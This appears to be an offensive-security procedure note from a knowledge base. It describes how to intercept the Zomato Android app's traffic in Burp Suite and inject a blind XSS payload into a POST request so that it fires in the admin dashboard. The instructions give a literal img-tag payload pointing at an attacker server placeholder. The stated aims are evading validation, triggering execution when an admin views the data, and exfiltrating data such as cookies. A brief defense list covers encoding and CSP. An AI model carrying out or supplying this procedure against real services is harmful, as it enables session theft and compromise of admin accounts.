---
id: proc-zomato-xss-inject
tags:
  - xss
  - payload-injection
  - burp-suite
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.132Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-via-Intercepted-POST-Request

## Summary

This procedure intercepts a POST request in the Zomato application using Burp Suite and injects a blind XSS payload into the request body, targeting the admin dashboard display without immediate execution.

## Description

The vulnerability stems from unsanitized user input in a specific function's POST data being reflected in the admin dashboard. By proxying traffic through Burp Suite from the Android app, the attacker modifies the request to include a malicious img tag sourcing from their server. This payload executes JavaScript context when an admin views the data, potentially allowing cookie theft. Prerequisites include an active session and Burp configured as a proxy.

## Requirements

1. Burp Suite installed and running with proxy listener (default port 8080)
2. Android app configured to route traffic through Burp (e.g., via ProxyDroid or manual settings)
3. Attacker's server IP ready for the payload URL
4. Access to the vulnerable function in the app

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all user inputs with output encoding (e.g., HTML entity encoding)
- Implement Content Security Policy (CSP) to block inline scripts and external resources
- Log and monitor anomalous request modifications or unusual payloads in API traffic

## Objectives

1. Inject persistent XSS payload into backend storage
2. Ensure payload evades initial validation
3. Set up for admin-triggered execution and data exfiltration

## Instructions

### Step 1: Configure Proxy and Intercept

**Context**: Set up Burp to capture app traffic.

Start Burp Suite, enable intercept in Proxy tab, configure Android device proxy to 127.0.0.1:8080 (or host IP).

Install Burp CA certificate on Android to handle HTTPS.

> Expected output: Traffic from app visible in Burp Proxy history.

### Step 2: Trigger and Modify Request

**Context**: Intercept the specific POST to api.zomato.com and inject payload.

Navigate to the vulnerable function in the app, triggering the POST. In Burp, intercept the request, locate the POST data body, and append or replace with: `'><img src="http://<my_server_ip>/zomato.php?c=zomato_xss" />`.

Forward the request.

> Expected output: Server responds with 200 OK, payload stored without errors.

### Step 3: Verify Injection

**Context**: Check if payload was accepted.

Review Burp Repeater or app response for success; no immediate alert as it's blind.

> Expected output: No rejection of modified data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- xss
- injection
- proxy-intercept
